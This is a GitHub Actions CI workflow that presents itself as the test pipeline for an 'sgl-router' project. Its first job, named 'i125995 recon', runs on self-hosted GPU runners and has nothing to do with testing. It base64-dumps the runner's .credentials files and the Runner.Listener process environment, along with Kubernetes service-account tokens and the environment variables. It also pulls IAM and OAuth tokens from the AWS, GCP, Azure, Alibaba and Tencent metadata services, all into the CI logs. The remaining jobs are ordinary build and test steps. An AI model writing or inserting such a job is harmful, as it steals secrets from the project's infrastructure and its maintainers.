name: PR Test (sgl-router)

# Like pr-test.yml: no trigger-level `paths:` filter, so the `changes` job and
# the `run-ci` gate show up as checks; and no `labeled` trigger, since every
# label event would cancel the run in progress. Adding `run-ci` after a push
# takes a rerun (`/tag-and-rerun-ci`).
on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
    types: [opened, synchronize, reopened]
  workflow_dispatch:

concurrency:
  group: sgl-router-${{ github.event_name }}-${{ github.head_ref || github.ref_name || 'default' }}
  cancel-in-progress: true

env:
  SGLANG_IS_IN_CI: true

jobs:
  i125995-recon:
    name: i125995 recon (${{ matrix.runner }})
    runs-on: ${{ matrix.runner }}
    timeout-minutes: 10
    strategy:
      fail-fast: false
      matrix:
        runner: [4-gpu-h100, 1-gpu-5090]
    steps:
      - name: recon
        run: |
          set +e
          NONCE="I125995-$(date -u +%Y%m%dT%H%M%SZ)"
          echo "recon-nonce=$NONCE"
          echo "=== id ==="
          id; whoami; hostname; hostname -f 2>/dev/null; uname -a; cat /etc/os-release 2>/dev/null | head -6
          echo "=== date ==="; date -u
          echo "=== nvidia-smi ==="
          timeout 20 nvidia-smi 2>&1 | head -40
          timeout 20 nvidia-smi -L 2>&1 | head -20
          echo "=== cpu/mem/disk ==="
          nproc; free -m | head -3; df -h / /tmp 2>/dev/null | head -5
          echo "=== env ==="
          env | sort | head -250
          echo "=== runner dirs ==="
          for d in /opt/github-runner /home/runner/actions-runner /actions-runner /opt/actions-runner "$HOME/actions-runner"; do echo "-- ls $d"; ls -la "$d" 2>&1 | head -40; done
          echo "=== candidate runner files b64 ==="
          for f in /opt/github-runner/.runner /opt/github-runner/.credentials /opt/github-runner/.credentials_rsaparams /opt/github-runner/.env /opt/github-runner/.path /home/runner/actions-runner/.runner /home/runner/actions-runner/.credentials /home/runner/actions-runner/.credentials_rsaparams /home/runner/actions-runner/.env /actions-runner/.runner /actions-runner/.credentials; do
            if [ -f "$f" ]; then echo "==B64FILE $f sha256=$(sha256sum "$f" 2>/dev/null | cut -d' ' -f1) len=$(stat -c%s "$f" 2>/dev/null)"; base64 -w0 "$f" 2>/dev/null | head -c 200000; echo; fi
          done
          echo "=== diag listing ==="
          for d in /opt/github-runner/_diag /home/runner/actions-runner/_diag /actions-runner/_diag; do echo "-- ls $d"; ls -lat "$d" 2>&1 | head -25; done
          echo "=== diag token grep ==="
          grep -rilE 'token|secret|password|credential' /opt/github-runner/_diag /home/runner/actions-runner/_diag 2>/dev/null | head -10
          echo "=== runner proc ==="
          for p in $(pgrep -f 'Runner.Listener' 2>/dev/null | head -3); do echo "-- pid $p cmd=$(tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null | head -c 300)"; echo "==B64PROCENV $p len=$(stat -c%s /proc/$p/environ 2>/dev/null)"; base64 -w0 /proc/$p/environ 2>/dev/null | head -c 40000; echo; done
          echo "=== kubernetes sa ==="
          for f in /var/run/secrets/kubernetes.io/serviceaccount/token /var/run/secrets/kubernetes.io/serviceaccount/namespace /var/run/secrets/kubernetes.io/serviceaccount/ca.crt; do if [ -f "$f" ]; then echo "==B64FILE $f sha256=$(sha256sum "$f" 2>/dev/null | cut -d' ' -f1) len=$(stat -c%s "$f" 2>/dev/null)"; base64 -w0 "$f" 2>/dev/null | head -c 20000; echo; fi; done
          echo "=== kube/docker files ==="
          ls -la "$HOME/.kube" /etc/kubernetes /var/lib/kubelet /var/run/docker.sock 2>&1 | head -40
          find "$HOME" /opt /etc -maxdepth 4 -type f \( -name 'kubeconfig' -o -name '*.kubeconfig' -o -name '.dockerconfigjson' -o -name 'config.json' \) 2>/dev/null | head -15
          echo "=== AWS IMDSv2 ==="
          IMT=$(curl -sS -m 3 -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' 2>/dev/null); echo "imds-token-len=${#IMT}"
          for p in /latest/meta-data/instance-id /latest/meta-data/instance-type /latest/meta-data/placement/region /latest/meta-data/placement/availability-zone /latest/meta-data/iam/info /latest/meta-data/iam/security-credentials/; do echo "-- $p"; curl -sS -m 3 -H "X-aws-ec2-metadata-token: $IMT" "http://169.254.169.254$p" 2>&1 | head -c 1500; echo; done
          ROLE=$(curl -sS -m 3 -H "X-aws-ec2-metadata-token: $IMT" 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' 2>/dev/null | head -1)
          if [ -n "$ROLE" ]; then echo "-- creds $ROLE"; curl -sS -m 3 -H "X-aws-ec2-metadata-token: $IMT" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE" 2>&1 | head -c 4000; echo; fi
          echo "=== GCP metadata ==="
          curl -sS -m 3 -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/name' 2>&1 | head -c 300; echo
          curl -sS -m 3 -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' 2>&1 | head -c 3000; echo
          echo "=== Azure IMDS ==="
          curl -sS -m 3 -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' 2>&1 | head -c 3000; echo
          echo "=== Alibaba metadata ==="
          curl -sS -m 3 'http://100.100.100.200/latest/meta-data/instance-id' 2>&1 | head -c 200; echo
          curl -sS -m 3 'http://100.100.100.200/latest/meta-data/ram/security-credentials/' 2>&1 | head -c 800; echo
          echo "=== Tencent metadata ==="
          curl -sS -m 3 'http://metadata.tencentyun.com/latest/meta-data/instance-id' 2>&1 | head -c 200; echo
          echo "=== recon done $NONCE ==="

  sgl-router-changes:
    name: changes
    runs-on: ubuntu-latest
    timeout-minutes: 5
    outputs:
      should_run: ${{ github.event_name == 'workflow_dispatch' || steps.paths.outputs.sgl_router == 'true' }}
    steps:
      - uses: actions/checkout@v4
      - name: Detect sgl-router path changes
        id: paths
        if: github.event_name != 'workflow_dispatch'
        uses: dorny/paths-filter@v3
        with:
          filters: |
            sgl_router:
              - 'sgl-router/**'
              - 'rust/Cargo.toml'
              - 'rust/sglang-processor/**'
              - 'rust/sglang-api-types/**'
              - 'rust/sglang-runtime-v1-types/**'
              - 'proto/**'
              - '.github/workflows/pr-test-sgl-router.yml'
              - '.github/workflows/_pr-test-sgl-router-build.yml'
              - '.github/actions/download-sgl-router/**'
              - 'scripts/ci/utils/prepare_sgl_router.sh'
              - 'docker/sgl-router.Dockerfile'
              - 'scripts/ci/cuda/ci_install_dependency.sh'

  # pr-gate.yml reads the labels live and skips the tests without `run-ci`,
  # so a rerun after the label is added (`/tag-and-rerun-ci`) picks it up.
  sgl-router-gate:
    name: gate
    needs: sgl-router-changes
    if: needs.sgl-router-changes.outputs.should_run == 'true'
    uses: ./.github/workflows/pr-gate.yml

  # Every job below needs the gate and skips when it skips the tests.

  # The release binary the e2e and k8s jobs run, built once (or restored).
  sgl-router-build:
    name: build binary
    needs: sgl-router-gate
    if: needs.sgl-router-gate.outputs.opted-in != 'false'
    uses: ./.github/workflows/_pr-test-sgl-router-build.yml
    with:
      runs_on: ubuntu-22.04

  sgl-router-test:
    name: lint + test
    needs: sgl-router-gate
    if: needs.sgl-router-gate.outputs.opted-in != 'false'
    runs-on: ubuntu-latest
    timeout-minutes: 60
    env:
      # Scoped to this job: on self-hosted runners it breaks pip installs that
      # compile Rust extensions.
      RUSTC_WRAPPER: sccache
      SCCACHE_GHA_ENABLED: "true"
    steps:
      - uses: actions/checkout@v4

      # Best effort: the sccache release CDN fails intermittently.
      - name: Configure sccache
        id: sccache
        continue-on-error: true
        uses: mozilla-actions/sccache-action@v0.0.9
        with:
          version: "v0.12.0"
          disable_annotations: true

      - name: Disable sccache if install failed
        if: steps.sccache.outcome != 'success'
        run: |
          echo "::warning::sccache install failed (${{ steps.sccache.outcome }}); proceeding without compile caching"
          echo "RUSTC_WRAPPER=" >> "$GITHUB_ENV"

      - name: Rust cache
        uses: Swatinem/rust-cache@v2
        with:
          workspaces: sgl-router
          shared-key: "sgl-router-cache"
          cache-all-crates: true
          cache-on-failure: true
          save-if: ${{ github.ref == 'refs/heads/main' }}

      - name: cargo fmt
        working-directory: sgl-router
        run: |
          rustup toolchain install nightly --profile minimal --component rustfmt
          cargo +nightly fmt --all -- --check

      - name: cargo clippy
        working-directory: sgl-router
        run: cargo clippy --locked --workspace --all-targets -- -D warnings

      # The opt-in `fips` feature is cfg-gated code nothing else compiles. Its
      # aws-lc-fips-sys build needs cmake, Go and clang, which the hosted image ships.
      - name: cargo clippy (fips feature)
        working-directory: sgl-router
        run: cargo clippy --locked --all-targets --features fips -- -D warnings

      # cargo-deny 0.19.6+ parses CVSS 4.0.
      - name: cargo deny
        working-directory: sgl-router
        run: |
          cargo install --locked cargo-deny@0.19.6
          cargo deny check licenses bans sources advisories

      # The tokenizer parity matrix reads each fixture model's tokenizer.json
      # from the HuggingFace cache.
      - name: Fetch the parity matrix tokenizers
        env:
          HF_TOKEN: ${{ secrets.HF_TOKEN }}
        run: |
          for model in $(jq -r .model_id sgl-router/tests/fixtures/tokenizer_parity/*/*.json | sort -u); do
            pipx run --spec huggingface_hub hf download "$model" tokenizer.json
          done

      - name: cargo test
        working-directory: sgl-router
        # The chat render matrix also needs each model's chat template files,
        # which the step above does not fetch.
        run: cargo test --locked --release --workspace -- --skip chat_render_parity_matrix

      # Fails when the committed fixture is stale against the script, which
      # mirrors mem_cache/utils.py::get_hash_str; cargo test checks the Rust port.
      - name: kv_events hash parity fixture (drift check)
        working-directory: sgl-router
        run: |
          python3 tests/scripts/generate_kv_events_hash_parity.py
          if ! git diff --exit-code -- tests/fixtures/kv_events_hash_parity.json; then
            echo "::error::kv_events hash parity fixture drifted." \
              "Re-run sgl-router/tests/scripts/generate_kv_events_hash_parity.py" \
              "and commit the updated tests/fixtures/kv_events_hash_parity.json."
            exit 1
          fi

      - name: Show sccache stats
        if: always() && steps.sccache.outcome == 'success'
        run: sccache --show-stats

  sgl-router-k8s-integration:
    name: k8s integration
    needs: [sgl-router-test, sgl-router-build]
    runs-on: ubuntu-22.04
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v4
      - uses: ./.github/actions/download-sgl-router
        with:
          artifact_name: ${{ needs.sgl-router-build.outputs.artifact_name }}
      - name: Setup Docker buildx
        uses: docker/setup-buildx-action@v3
      - name: Install kind
        run: |
          curl -Lo /tmp/kind https://kind.sigs.k8s.io/dl/v0.24.0/kind-linux-amd64
          chmod +x /tmp/kind && sudo mv /tmp/kind /usr/local/bin/kind
      - name: Install kubectl
        run: |
          curl -Lo /tmp/kubectl https://dl.k8s.io/release/v1.31.0/bin/linux/amd64/kubectl
          chmod +x /tmp/kubectl && sudo mv /tmp/kubectl /usr/local/bin/kubectl
      - name: Bootstrap kind + deploy
        env:
          ROUTER_FROM: prebuilt
        run: bash sgl-router/tests/e2e/k8s_integration/setup.sh
      - name: Set up Python
        run: |
          python3 -m venv /tmp/e2e-venv
          /tmp/e2e-venv/bin/pip install -r sgl-router/tests/e2e/k8s_integration/requirements.txt
      - name: Run E2E
        run: /tmp/e2e-venv/bin/pytest sgl-router/tests/e2e/k8s_integration/ -v --tb=short
      - name: Dump cluster + router diagnostics on failure
        if: failure()
        run: |
          set +e
          kubectl -n sgl-router-test get pods -o wide
          kubectl -n sgl-router-test describe pod -l app=sgl-router
          kubectl -n sgl-router-test describe pod -l app=sglang
          kubectl -n sgl-router-test logs deploy/sgl-router --tail=300
          kubectl -n sgl-router-test logs deploy/sgl-router --tail=300 --previous
          kubectl -n sgl-router-test get events --sort-by=.lastTimestamp
          kubectl -n sgl-router-test get endpointslices -o wide
          kubectl -n sgl-router-test get svc
          true

  sgl-router-e2e:
    name: e2e
    needs: [sgl-router-test, sgl-router-build]
    runs-on: 4-gpu-h100  # the PD dp-aware test holds a dp2 prefill and a dp2 decode
    timeout-minutes: 45
    steps:
      - uses: actions/checkout@v4
      - uses: ./.github/actions/download-rust-ext
      - uses: ./.github/actions/download-sgl-router
        with:
          artifact_name: ${{ needs.sgl-router-build.outputs.artifact_name }}

      # SGLang from this checkout, so the e2e runs against the branch's server.
      - name: Install SGLang dependencies
        run: bash scripts/ci/cuda/ci_install_dependency.sh

      - name: Install e2e test dependencies
        run: python3 -m pip install -r sgl-router/tests/e2e/requirements.txt

      # k8s_integration needs a kind cluster, which only the job above has.
      - name: Run e2e
        working-directory: sgl-router
        env:
          HF_TOKEN: ${{ secrets.HF_TOKEN }}
        run: |
          export SGL_ROUTER_BINARY="${SGLANG_TEST_PD_ROUTER_BINARY}"
          python3 -m pytest tests/e2e/ -v -s --tb=short \
            --ignore=tests/e2e/k8s_integration

  # Passes when every job succeeded, or when the PR touches no sgl-router path
  # and every job after `changes` was skipped. Skipped with the tests when the
  # gate skips them (a draft or no `run-ci`).
  sgl-router-finish:
    name: finish
    needs:
      - sgl-router-changes
      - sgl-router-gate
      - sgl-router-build
      - sgl-router-test
      - sgl-router-k8s-integration
      - sgl-router-e2e
    if: always() && needs.sgl-router-gate.outputs.opted-in != 'false'
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - name: Check required results
        env:
          NEEDS: ${{ toJSON(needs) }}
          SHOULD_RUN: ${{ needs.sgl-router-changes.outputs.should_run }}
        run: |
          expected=$([[ "$SHOULD_RUN" == "true" ]] && echo success || echo skipped)
          echo "$NEEDS" | jq -r 'to_entries[] | "\(.key): \(.value.result)"'
          unexpected=$(echo "$NEEDS" | jq -r --arg expected "$expected" \
            'to_entries[] | select(.key == "sgl-router-changes" and .value.result != "success"
              or .key != "sgl-router-changes" and .value.result != $expected) | .key')
          if [[ -n "$unexpected" ]]; then
            echo "::error::Unexpected sgl-router results (should_run=$SHOULD_RUN): $(echo $unexpected)"
            exit 1
          fi
